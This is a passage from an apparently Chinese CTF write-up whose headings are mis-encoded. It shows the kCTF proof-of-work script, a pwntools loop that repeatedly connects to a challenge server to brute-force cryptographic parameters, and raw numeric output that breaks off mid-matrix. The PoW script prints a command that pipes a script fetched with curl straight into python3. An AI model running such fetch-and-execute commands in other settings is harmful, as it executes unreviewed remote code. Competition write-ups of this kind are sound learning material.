constant_">SOLVER_URL</span> = <span class="string">&#x27;https://goo.gle/kctf-pow&#x27;</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">python_sloth_root</span>(x, diff, p):</span><br><span class="line">    exponent = (p + <span class="number">1</span>) <span class="comment">// 4</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(diff):</span><br><span class="line">        x = <span class="title function_">pow</span>(x, exponent, p) ^ <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">def <span class="title function_">python_sloth_square</span>(y, diff, p):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(diff):</span><br><span class="line">        y = <span class="title function_">pow</span>(y ^ <span class="number">1</span>, <span class="number">2</span>, p)</span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line">def <span class="title function_">gmpy_sloth_root</span>(x, diff, p):</span><br><span class="line">    exponent = (p + <span class="number">1</span>) <span class="comment">// 4</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(diff):</span><br><span class="line">        x = gmpy2.<span class="title function_">powmod</span>(x, exponent, p).<span class="title function_">bit_flip</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">int</span>(x)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">gmpy_sloth_square</span>(y, diff, p):</span><br><span class="line">    y = gmpy2.<span class="title function_">mpz</span>(y)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(diff):</span><br><span class="line">        y = gmpy2.<span class="title function_">powmod</span>(y.<span class="title function_">bit_flip</span>(<span class="number">0</span>), <span class="number">2</span>, p)</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">int</span>(y)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">sloth_root</span>(x, diff, p):</span><br><span class="line">    <span class="keyword">if</span> <span class="attr">HAVE_GMP</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">gmpy_sloth_root</span>(x, diff, p)</span><br><span class="line">    <span class="attr">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">python_sloth_root</span>(x, diff, p)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">sloth_square</span>(x, diff, p):</span><br><span class="line">    <span class="keyword">if</span> <span class="attr">HAVE_GMP</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">gmpy_sloth_square</span>(x, diff, p)</span><br><span class="line">    <span class="attr">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">python_sloth_square</span>(x, diff, p)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">encode_number</span>(num):</span><br><span class="line">    size = (num.<span class="title function_">bit_length</span>() <span class="comment">// 24) * 3 + 3</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">str</span>(base64.<span class="title function_">b64encode</span>(num.<span class="title function_">to_bytes</span>(size, <span class="string">&#x27;big&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">decode_number</span>(enc):</span><br><span class="line">    <span class="keyword">return</span> int.<span class="title function_">from_bytes</span>(base64.<span class="title function_">b64decode</span>(<span class="title function_">bytes</span>(enc, <span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">decode_challenge</span>(enc):</span><br><span class="line">    dec = enc.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> dec[<span class="number">0</span>] != <span class="attr">VERSION</span>:</span><br><span class="line">        raise <span class="title class_">Exception</span>(<span class="string">&#x27;Unknown challenge version&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">list</span>(<span class="title function_">map</span>(decode_number, dec[<span class="number">1</span>:]))</span><br><span class="line"></span><br><span class="line">def <span class="title function_">encode_challenge</span>(arr):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span>.<span class="title function_">join</span>([<span class="variable constant_">VERSION</span>] + <span class="title function_">list</span>(<span class="title function_">map</span>(encode_number, arr)))</span><br><span class="line"></span><br><span class="line">def <span class="title function_">get_challenge</span>(diff):</span><br><span class="line">    x = secrets.<span class="title function_">randbelow</span>(<span class="variable constant_">CHALSIZE</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">encode_challenge</span>([diff, x])</span><br><span class="line"></span><br><span class="line">def <span class="title function_">solve_challenge</span>(chal):</span><br><span class="line">    [diff, x] = <span class="title function_">decode_challenge</span>(chal)</span><br><span class="line">    y = <span class="title function_">sloth_root</span>(x, diff, <span class="variable constant_">MODULUS</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">encode_challenge</span>([y])</span><br><span class="line"></span><br><span class="line">def <span class="title function_">can_bypass</span>(chal, sol):</span><br><span class="line">    <span class="keyword">from</span> ecdsa <span class="keyword">import</span> <span class="title class_">VerifyingKey</span></span><br><span class="line">    <span class="keyword">from</span> ecdsa.<span class="property">util</span> <span class="keyword">import</span> sigdecode_der</span><br><span class="line">    <span class="keyword">if</span> not sol.<span class="title function_">startswith</span>(<span class="string">&#x27;b.&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">False</span></span><br><span class="line">    sig = bytes.<span class="title function_">fromhex</span>(sol[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">with</span> <span class="title function_">open</span>(<span class="string">&quot;/kctf/pow-bypass/pow-bypass-key-pub.pem&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> <span class="attr">fd</span>:</span><br><span class="line">        vk = <span class="title class_">VerifyingKey</span>.<span class="title function_">from_pem</span>(fd.<span class="title function_">read</span>())</span><br><span class="line">    <span class="keyword">return</span> vk.<span class="title function_">verify</span>(signature=sig, data=<span class="title function_">bytes</span>(chal, <span class="string">&#x27;ascii&#x27;</span>), hashfunc=hashlib.<span class="property">sha256</span>, sigdecode=sigdecode_der)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">verify_challenge</span>(chal, sol, allow_bypass=<span class="title class_">True</span>):</span><br><span class="line">    <span class="keyword">if</span> allow_bypass and <span class="title function_">can_bypass</span>(chal, sol):</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">True</span></span><br><span class="line">    [diff, x] = <span class="title function_">decode_challenge</span>(chal)</span><br><span class="line">    [y] = <span class="title function_">decode_challenge</span>(sol)</span><br><span class="line">    res = <span class="title function_">sloth_square</span>(y, diff, <span class="variable constant_">MODULUS</span>)</span><br><span class="line">    <span class="keyword">return</span> (x == res) or (<span class="variable constant_">MODULUS</span> - x == res)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">usage</span>():</span><br><span class="line">    sys.<span class="property">stdout</span>.<span class="title function_">write</span>(<span class="string">&#x27;Usage:\n&#x27;</span>)</span><br><span class="line">    sys.<span class="property">stdout</span>.<span class="title function_">write</span>(<span class="string">&#x27;Solve pow: &#123;&#125; solve $challenge\n&#x27;</span>)</span><br><span class="line">    sys.<span class="property">stdout</span>.<span class="title function_">write</span>(<span class="string">&#x27;Check pow: &#123;&#125; ask $difficulty\n&#x27;</span>)</span><br><span class="line">    sys.<span class="property">stdout</span>.<span class="title function_">write</span>(<span class="string">&#x27;  $difficulty examples (for 1.6GHz CPU) in fast mode:\n&#x27;</span>)</span><br><span class="line">    sys.<span class="property">stdout</span>.<span class="title function_">write</span>(<span class="string">&#x27;             1337:   1 sec\n&#x27;</span>)</span><br><span class="line">    sys.<span class="property">stdout</span>.<span class="title function_">write</span>(<span class="string">&#x27;             31337:  30 secs\n&#x27;</span>)</span><br><span class="line">    sys.<span class="property">stdout</span>.<span class="title function_">write</span>(<span class="string">&#x27;             313373: 5 mins\n&#x27;</span>)</span><br><span class="line">    sys.<span class="property">stdout</span>.<span class="title function_">flush</span>()</span><br><span class="line">    sys.<span class="title function_">exit</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">len</span>(sys.<span class="property">argv</span>) != <span class="number">3</span>:</span><br><span class="line">        <span class="title function_">usage</span>()</span><br><span class="line">        sys.<span class="title function_">exit</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    cmd = sys.<span class="property">argv</span>[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cmd == <span class="string">&#x27;ask&#x27;</span>:</span><br><span class="line">        difficulty = <span class="title function_">int</span>(sys.<span class="property">argv</span>[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> difficulty == <span class="number">0</span>:</span><br><span class="line">            sys.<span class="property">stdout</span>.<span class="title function_">write</span>(<span class="string">&quot;== proof-of-work: disabled ==\n&quot;</span>)</span><br><span class="line">            sys.<span class="title function_">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        challenge = <span class="title function_">get_challenge</span>(difficulty)</span><br><span class="line"></span><br><span class="line">        sys.<span class="property">stdout</span>.<span class="title function_">write</span>(<span class="string">&quot;== proof-of-work: enabled ==\n&quot;</span>)</span><br><span class="line">        sys.<span class="property">stdout</span>.<span class="title function_">write</span>(<span class="string">&quot;please solve a pow first\n&quot;</span>)</span><br><span class="line">        sys.<span class="property">stdout</span>.<span class="title function_">write</span>(<span class="string">&quot;You can run the solver with:\n&quot;</span>)</span><br><span class="line">        sys.<span class="property">stdout</span>.<span class="title function_">write</span>(<span class="string">&quot;    python3 &lt;(curl -sSL &#123;&#125;) solve &#123;&#125;\n&quot;</span>.<span class="title function_">format</span>(<span class="variable constant_">SOLVER_URL</span>, challenge))</span><br><span class="line">        sys.<span class="property">stdout</span>.<span class="title function_">write</span>(<span class="string">&quot;===================\n&quot;</span>)</span><br><span class="line">        sys.<span class="property">stdout</span>.<span class="title function_">write</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        sys.<span class="property">stdout</span>.<span class="title function_">write</span>(<span class="string">&quot;Solution? &quot;</span>)</span><br><span class="line">        sys.<span class="property">stdout</span>.<span class="title function_">flush</span>()</span><br><span class="line">        solution = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> os.<span class="title function_">fdopen</span>(<span class="number">0</span>, <span class="string">&quot;rb&quot;</span>, <span class="number">0</span>) <span class="keyword">as</span> <span class="attr">f</span>:</span><br><span class="line">            <span class="keyword">while</span> not <span class="attr">solution</span>:</span><br><span class="line">                line = f.<span class="title function_">readline</span>().<span class="title function_">decode</span>(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> not <span class="attr">line</span>:</span><br><span class="line">                    sys.<span class="property">stdout</span>.<span class="title function_">write</span>(<span class="string">&quot;EOF&quot;</span>)</span><br><span class="line">                    sys.<span class="property">stdout</span>.<span class="title function_">flush</span>()</span><br><span class="line">                    sys.<span class="title function_">exit</span>(<span class="number">1</span>)</span><br><span class="line">                solution = line.<span class="title function_">strip</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="title function_">verify_challenge</span>(challenge, solution):</span><br><span class="line">            sys.<span class="property">stdout</span>.<span class="title function_">write</span>(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line">            sys.<span class="property">stdout</span>.<span class="title function_">flush</span>()</span><br><span class="line">            sys.<span class="title function_">exit</span>(<span class="number">0</span>)</span><br><span class="line">        <span class="attr">else</span>:</span><br><span class="line">            sys.<span class="property">stdout</span>.<span class="title function_">write</span>(<span class="string">&quot;Proof-of-work fail&quot;</span>)</span><br><span class="line">            sys.<span class="property">stdout</span>.<span class="title function_">flush</span>()</span><br><span class="line"></span><br><span class="line">    elif cmd == <span class="string">&#x27;solve&#x27;</span>:</span><br><span class="line">        challenge = sys.<span class="property">argv</span>[<span class="number">2</span>]</span><br><span class="line">        solution = <span class="title function_">solve_challenge</span>(challenge)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="title function_">verify_challenge</span>(challenge, solution, <span class="title class_">False</span>):</span><br><span class="line">            sys.<span class="property">stderr</span>.<span class="title function_">write</span>(<span class="string">&quot;Solution: \n&quot;</span>.<span class="title function_">format</span>(solution))</span><br><span class="line">            sys.<span class="property">stderr</span>.<span class="title function_">flush</span>()</span><br><span class="line">            sys.<span class="property">stdout</span>.<span class="title function_">write</span>(solution)</span><br><span class="line">            sys.<span class="property">stdout</span>.<span class="title function_">flush</span>()</span><br><span class="line">            sys.<span class="property">stderr</span>.<span class="title function_">write</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            sys.<span class="property">stderr</span>.<span class="title function_">flush</span>()</span><br><span class="line">            sys.<span class="title function_">exit</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="attr">else</span>:</span><br><span class="line">        <span class="title function_">usage</span>()</span><br><span class="line"></span><br><span class="line">    sys.<span class="title function_">exit</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="title function_">main</span>()</span><br></pre></td></tr></table></figure>

<p>è·‘ä¸»ç¨‹åºçˆ†ç ´å‚æ•°</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    p=<span class="title function_">remote</span>(<span class="string">&quot;121.41.9.20&quot;</span>,<span class="string">&quot;6665&quot;</span>)</span><br><span class="line">    p.<span class="title function_">recvuntil</span>(b<span class="string">&quot;kctf-pow)&quot;</span>)</span><br><span class="line">    s=p.<span class="title function_">recvline</span>()</span><br><span class="line">    q=<span class="title function_">popen</span>(<span class="string">&quot; python3 n1pow.py &quot;</span>+s.<span class="title function_">decode</span>()).<span class="title function_">read</span>()</span><br><span class="line">    p.<span class="title function_">sendline</span>(q)</span><br><span class="line">    p.<span class="title function_">recvuntil</span>(b<span class="string">&quot;N =&quot;</span>)</span><br><span class="line">    s=p.<span class="title function_">recvline</span>()</span><br><span class="line">    N=<span class="title function_">int</span>(s)</span><br><span class="line">    q=<span class="title function_">process</span>(<span class="string">&quot;c.sage&quot;</span>)</span><br><span class="line">    q.<span class="title function_">sendline</span>(<span class="title function_">str</span>(N).<span class="title function_">encode</span>())</span><br><span class="line">    <span class="title function_">print</span>(q.<span class="title function_">recvline</span>())</span><br><span class="line">    <span class="title function_">print</span>(q.<span class="title function_">recvline</span>())</span><br><span class="line">    s=(q.<span class="title function_">recvline</span>())</span><br><span class="line">    <span class="title function_">print</span>(s)</span><br><span class="line">    <span class="keyword">if</span> b<span class="string">&quot;wrong&quot;</span> <span class="keyword">in</span> <span class="attr">s</span>:</span><br><span class="line">        q.<span class="title function_">close</span>()</span><br><span class="line">        p.<span class="title function_">close</span>()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    p.<span class="title function_">sendline</span>(s)</span><br><span class="line">    <span class="title function_">print</span>(q.<span class="title function_">recvline</span>())</span><br><span class="line">    <span class="title function_">print</span>(q.<span class="title function_">recvline</span>())</span><br><span class="line"></span><br><span class="line">    p.<span class="title function_">recvuntil</span>(b<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    f=<span class="title function_">open</span>(<span class="string">&quot;ans&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">5</span>):</span><br><span class="line">        s=p.<span class="title function_">recvline</span>().<span class="title function_">decode</span>()</span><br><span class="line">        f.<span class="title function_">write</span>(s)</span><br><span class="line">    f.<span class="title function_">close</span>()</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°çš„æ•°æ®å¦‚ä¸‹</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line">[+] <span class="title class_">Starting</span> local process <span class="string">&#x27;./c.sage&#x27;</span>: pid <span class="number">41666</span></span><br><span class="line">b<span class="string">&#x27;Cyclotomic_Polynomials Phi: x + 1\n&#x27;</span></span><br><span class="line">b<span class="string">&#x27;Psi: z - 1\n&#x27;</span></span><br><span class="line">b<span class="string">&#x27;wrong\n&#x27;</span></span><br><span class="line">[*] <span class="title class_">Stopped</span> process <span class="string">&#x27;./c.sage&#x27;</span> (pid <span class="number">41666</span>)</span><br><span class="line">[*] <span class="title class_">Closed</span> connection to <span class="number">121.41</span><span class="number">.9</span><span class="number">.20</span> port <span class="number">6665</span></span><br><span class="line">[+] <span class="title class_">Opening</span> connection to <span class="number">121.41</span><span class="number">.9</span><span class="number">.20</span> on port <span class="number">6665</span>: <span class="title class_">Done</span></span><br><span class="line"><span class="title class_">Solution</span>: </span><br><span class="line"></span><br><span class="line">[+] <span class="title class_">Starting</span> local process <span class="string">&#x27;./c.sage&#x27;</span>: pid <span class="number">41925</span></span><br><span class="line">b<span class="string">&#x27;Cyclotomic_Polynomials Phi: x + 1\n&#x27;</span></span><br><span class="line">b<span class="string">&#x27;Psi: z - 1\n&#x27;</span></span><br><span class="line">b<span class="string">&#x27;1094477304520127985790672621025600999610374173335205039140666609042008538358640473234617871224544718583218818352868128358491538147523272150726235978173256045229998201241704950147287615608045349561023357107016512696700676043527970164 , 1030763785771014717987046304138394442836489889852139479828737981379477233707655574344364525812555575119657470138367621943896352669484624126417247531463800890500345489912586031653601473632884174617800095966332075198093606668070092424\n&#x27;</span></span><br><span class="line">b<span class="string">&#x27;(1094477304520127985790672621025600999610374173335205039140666609042008538358640473234617871224544718583218818352868128358491538147523272150726235978173256045229998201241704950147287615608045349561023357107016512696700676043527970164 : 1030763785771014717987046304138394442836489889852139479828737981379477233707655574344364525812555575119657470138367621943896352669484624126417247531463800890500345489912586031653601473632884174617800095966332075198093606668070092424 : 1)\n&#x27;</span></span><br><span class="line">b<span class="string">&#x27;(1094477304520127985790672621025600999610374173335205039140666609042008538358640473234617871224544718583218818352868128358491538147523272150726235978173256045229998201241704950147287615608045349561023357107016512696700676043527970164 : 1030763785771014717987046304138394442836489889852139479828737981379477233707655574344364525812555575119657470138367621943896352669484624126417247531463800890500345489912586031653601473632884174617800095966332075198093606668070092424 : 1)\n&#x27;</span></span><br><span class="line"> A = [[<span class="number">2491297</span>, <span class="number">3923144</span>, <span class="number">1289455</span>, <span class="number">4021716</span>, <span class="number">337975</span>, <span class="number">3143770</span>, <span class="number">3557950</span>, <span class="number">341304</span>, <span class="number">455942</span>, <span class="number">4177670</span>, <span class="number">3340546</span>, <span class="number">4028765</span>, <span class="number">2320870</span>, <span class="number">3081978</span>, <span class="number">818985</span>, <span class="number">3242259</span>, <span class="number">995549</span>, <span class="number">2729547</span>, <span class="number">219631</span>, <span class="number">2130206</span>, <span class="number">2431889</span>, <span class="number">3437133</span>, <span class="number">705892</span>, <span class="number">3268589</span>, <span class="number">3687934</span>, <span class="number">958931</span>, <span class="number">2516192</span>, <span class="number">1860165</span>, <span class="number">1023453</span>, <span class="number">2954972</span>, <span class="number">2407318</span>, <span class="number">3854332</span>, <span class="number">2320389</span>, <span class="number">1597429</span>, <span class="number">171260</span>, <span class="number">2195369</span>, <span class="number">1977065</span>, <span class="number">2954121</span>, <span class="number">103688</span>, <span class="number">2179696</span>, <span class="number">3341984</span>, <span class="number">941977</span>, <span class="number">3206534</span>, <span class="number">1013687</span>, <span class="number">2216577</span>, <span class="number">2195795</span>, <span class="number">237843</span>, <span class="number">2334271</span>, <span class="number">2206600</span>, <span class="number">608485</span>, <span class="number">3503558</span>, <span class="number">2473745</span>, <span class="number">3883407</span>, <span class="number">3529280</span>, <span class="number">218265</span>, <span class="number">3883654</span>, <span class="number">324031</span>, <span class="number">186429</span>, <span class="number">4126800</span>, <span class="number">3153156</span>, <span class="number">2220126</span>, <span class="number">4061700</span>, <span class="number">3316219</span>, <span class="number">3172105</span>, <span class="number">1847039</span>, <span class="number">3294403</span>, <span class="number">4147423</span>, <span class="number">256592</span>, <span class="number">3436950</span>, <span class="number">3100090</span>, <span class="number">1520285</span>, <span class="number">2064569</span>, <span class="number">2565047</span>, <span class="number">1028084</span>, <span class="number">1620973</span>, <span class="number">1948607</span>, <span class="number">3549132</span>, <span class="number">2359710</span>, <span class="number">1992828</span>, <span class="number">3487450</span>, <span class="number">3612080</span>, <span class="number">441053</span>, <span class="number">2199156</span>, <span class="number">2890422</span>, <span class="number">2562147</span>, <span class="number">369063</span>, <span class="number">4107126</span>, <span class="number">1146899</span>, <span class="number">2775186</span>, <span class="number">3074284</span>, <span class="number">2753658</span>, <span class="number">4182387</span>, <span class="number">3832577</span>, <span class="number">775926</span>, <span class="number">4107285</span>, <span class="number">27264</span>, <span class="number">2878053</span>, <span class="number">515185</span>, <span class="number">258373</span>, <span class="number">1455220</span>, <span class="number">2856349</span>, <span class="number">2462819</span>, <span class="number">865942</span>, <span class="number">326474</span>, <span class="number">3358641</span>, <span class="number">948506</span>, <span class="number">2445678</span>, <span class="number">1017908</span>, <span class="number">3547779</span>, <span class="number">658361</span>, <span class="number">2829207</span>, <span class="number">1683034</span>, <span class="number">3768709</span>, <span class="number">233977</span>, <span class="number">2944173</span>, <span class="number">2089850</span>, <span class="number">2168140</span>, <span class="number">804839</span>, <span class="number">780839</span>, <span class="number">635210</span>, <span class="number">1308962</span>, <span class="number">1163123</span>, <span class="number">1713794</span>, <span class="number">98445</span>, <span class="number">2589738</span>, <span class="number">3272446</span>, <span class="number">2326080</span>, <span class="number">505141</span>, <span class="number">3906582</span>, <span class="number">4077935</span>, <span class="number">1000292</span>, <span class="number">3121629</span>, <span class="number">2704903</span>, <span class="number">3250847</span>, <span class="number">2300956</span>, <span class="number">2865041</span>, <span class="number">282192</span>, <span class="number">2033060</span>, <span class="number">657556</span>, <span class="number">1942823</span>, <span class="number">3110353</span>, <span class="number">3376364</span>, <span class="number">718090</span>, <span class="number">1806372</span>, <span class="number">499584</span>, <span class="number">3522863</span>, <span class="number">1521762</span>, <span class="number">2786971</span>, <span class="number">2140682</span>, <span class="number">216926</span>, <span class="number">753243</span>, <span class="number">2974405</span>, <span class="number">3427513</span>, <span class="number">1482251</span>, <span class="number">2946392</span>, <span class="number">620784</span>, <span class="number">2812018</span>, <span class="number">3708482</span>, <span class="number">3628507</span>, <span class="number">1350323</span>, <span class="number">2669060</span>, <span class="number">871044</span>, <span class="number">4080642</span>, <span class="number">48697</span>, <span class="number">831735</span>, <span class="number">2081975</span>, <span class="number">1003680</span>, <span class="number">2779456</span>, <span class="number">2768433</span>, <span class="number">1319487</span>, <span class="number">2764139</span>, <span class="number">2743293</span>, <span class="number">500875</span>, <span class="number">2756771</span>, <span class="number">688928</span>, <span class="number">2420450</span>, <span class="number">2542999</span>, <span class="number">3781383</span>, <span class="number">4020987</span>, <span class="number">4000070</span>, <span class="number">1373818</span>, <span class="number">923562</span>, <span class="number">877075</span>, <span class="number">2970373</span>, <span class="number">3037725</span>, <span class="number">3289830</span>, <span class="number">2511141</span>, <span class="number">4063531</span>, <span class="number">1637947</span>, <span class="number">23000</span>, <span class="number">4187246</span>, <span class="number">1996064</span>, <span class="number">1458136</span>, <span class="number">3977302</span>, <span class="number">3491665</span>, <span class="number">1028387</span>, <span class="number">4028398</span>, <span class="number">397765</span>, <span class="number">1760132</span>, <span class="number">3153398</span>, <span class="number">3810161</span>, <span class="number">1971495</span>, <span class="number">756643</span>, <span class="number">181167</span>, <span class="number">3346185</span>, <span class="number">2046059</span>, <span class="number">1731694</span>, <span class="number">1482343</span>, <span class="number">1273960</span>, <span class="number">3769920</span>, <span class="number">175011</span>, <span class="number">1974455</span>, <span class="number">2847092</span>, <span class="number">3199068</span>, <span class="number">1133365</span>, <span class="number">1840605</span>, <span class="number">1382941</span>, <span class="number">336790</span>, <span class="number">246835</span>, <span class="number">3524062</span>, <span class="number">2275571</span>, <span class="number">260893</span>, <span class="number">2522464</span>, <span class="number">3760909</span>, <span class="number">2401319</span>, <span class="number">1972892</span>, <span class="number">2192355</span>, <span class="number">2348559</span>, <span class="number">2968746</span>, <span class="number">1303894</span>, <span class="number">4037725</span>, <span class="number">1070976</span>, <span class="number">1650576</span>, <span class="number">3755849</span>, <span class="number">1724561</span>, <span class="number">1374666</span>, <span class="number">653155</span>, <span class="number">19966</span>, <span class="number">2152355</span>, <span class="number">3737399</span>, <span class="number">3755720</span>, <span class="number">1139557</span>, <span class="number">2850582</span>, <span class="number">3856019</span>, <span class="number">605733</span>, <span class="number">800279</span>, <span class="number">3507621</span>, <span class="number">311368</span>, <span class="number">1360210</span>, <span class="number">3610070</span>, <span class="number">1018469</span>, <span class="number">734703</span>, <span class="number">4111035</span>, <span class="number">3317616</span>, <span class="number">2509163</span>, <span class="number">1027214</span>], [<span class="number">2345579</span>, <span class="number">3645598</span>, <span class="number">3313317</span>, <span class="number">868986</span>, <span class="number">2201238</span>, <span class="number">1012434</span>, <span class="number">4189116</span>, <span class="number">1833309</span>, <span class="number">4173250</span>, <span class="number">1539013</span>, <span class="number">2558865</span>, <span class="number">2459736</span>, <span class="number">3040085</span>, <span class="number">2641552</span>, <span class="number">2193150</span>, <span class="number">3142570</span>, <span class="number">2096227</span>, <span class="number">3497720</span>, <span class="number">3677427</span>, <span class="number">2826051</span>, <span class="number">2201963</span>, <span class="number">2032938</span>, <span class="number">1751020</span>, <span class="number">2338084</span>, <span class="number">501735</span>, <span class="number">1528173</span>, <span class="number">1190332</span>, <span class="number">4039135</span>, <span class="number">1073609</span>, <span class="number">2545180</span>, <span class="number">1483656</span>, <span class="number">2261722</span>, <span class="number">1502393</span>, <span class="number">1950848</span>, <span class="number">3415037</span>, <span class="number">2883983</span>, <span class="number">2952067</span>, <span class="number">2642902</span>, <span class="number">150578</span>, <span class="number">710864</span>, <span class="number">988399</span>, <span class="number">633646</span>, <span class="number">3124896</span>, <span class="number">1048336</span>, <span class="number">3864721</span>, <span class="number">328673</span>, <span class="number">1853513</span>, <span class="number">364917</span>, <span class="number">3308868</span>, <span class="number">1171552</span>, <span class="number">3653516</span>, <span class="number">1468422</span>, <span class="number">3032090</span>, <span class="number">2842047</span>, <span class="number">254437</span>, <span class="number">2104220</span>, <span class="number">2876379</span>, <span class="number">3130725</span>, <span class="number">1805478</span>, <span class="number">1526141</span>, <span class="number">1050520</span>, <span class="number">2759137</span>, <span class="number">634328</span>, <span class="number">4144451</span>, <span class="number">1239675</span>, <span class="number">557252</span>, <span class="number">3977009</span>, <span class="number">1058165</span>, <span class="number">4061107</span>, <span class="number">1956486</span>, <span class="number">3965945</span>, <span class="number">3733416</span>, <span class="number">1361329</span>, <span class="number">84827</span>, <span class="number">2915466</span>, <span class="number">4006254</span>, <span class="number">3823624</span>, <span class="number">2452237</span>, <span class="number">2204002</span>, <span class="number">1089647</span>, <span class="number">1309236</span>, <span class="number">2259059</span>, <span class="number">2315689</span>, <span class="number">161139</span>, <span class="number">3420761</span>, <span class="number">3165117</span>, <span class="number">32634</span>, <span class="number">310702</span>, <span class="number">1795941</span>, <span class="number">3035148</span>, <span class="number">1184669</span>, <span class="number">2379592</span>, <span class="number">1857466</span>, <span class="number">134155</span>, <span class="number">2562046</span>, <span class="number">254428</span>, <span class="number">1773396</span>, <span class="number">1212942</span>, <span class="number">2335734</span>, <span class="number">2443291</span>, <span class="number">538951</span>, <span class="number">1855586</span>, <span class="number">1032635</span>, <span class="number">3763662</span>, <span class="number">4017205</span>, <span class="number">2329915</span>, <span class="number">2709951</span>, <span class="number">723648</span>, <span class="number">168887</span>, <span class="number">838418</span>, <span class="number">938926</span>, <span class="number">1732765</span>, <span class="number">3484614</span>, <span class="number">3417960</span>, <span class="number">83567</span>, <span class="number">363241</span>, <span class="number">327574</span>, <span class="number">433880</span>, <span class="number">1098638</span>, <span class="number">179849</span>, <span class="number">2172410</span>, <span class="number">3152540</span>, <span class="number">1782369</span>, <span class="number">3655145</span>, <span class="number">2103838</span>, <span class="number">2060915</span>, <span class="number">1347678</span>, <span class="number">2374927</span>, <span class="number">3158348</span>, <span class="number">1250185</span>, <span class="number">3539603</span>, <span class="number">2618718</span>, <span class="number">815436</span>, <span class="number">2951094</span>, <span class="number">3879951</span>, <span class="number">1406088</span>, <span class="number">3907098</span>, <span class="number">3816768</span>, <span class="number">1957820</span>, <span class="number">2878717</span>, <span class="number">3972083</span>, <span class="number">1619762</span>, <span class="number">4147989</span>, <span class="number">3924744</span>, <span class="number">142801</span>, <span class="number">2985546</span>, <span class="number">2900015</span>, <span class="number">379251</span>, <span class="number">924103</span>, <span class="number">560227</span>, <span class="number">893488</span>, <span class="number">2927729</span>, <span class="number">3043682</span>, <span class="number">2100176</span>, <span class="number">3095382</span>, <span class="number">1948851</span>, <span class="number">818115</span>, <span class="number">1370625</span>, <span class="number">384082</span>, <span class="number">4177415</span>, <span class="number">3928916</span>, <span class="number">2162582</span>, <span class="number">3336817</span>, <span class="number">2073043</span>, <span class="number">3104122</span>, <span class="number">3531532</span>, <span class="number">3725890</span>, <span class="number">671778</span>, <span class="number">1545701</span>, <span class="number">1455832</span>, <span class="number">2491527</span>, <span class="number">2886274</span>, <span class="number">2566667</span>, <span class="number">2913638</span>, <span class="number">2814684</span>, <span class="number">1363911</span>, <span class="number">1069791</span>, <span class="number">3122004</span>, <span class="number">4138263</span>, <span class="number">1118042</span>, <span class="number">2967808</span>, <span class="number">1943444</span>, <span class="number">1439078</span>, <span class="number">1427258</span>, <span class="number">649506</span>, <span 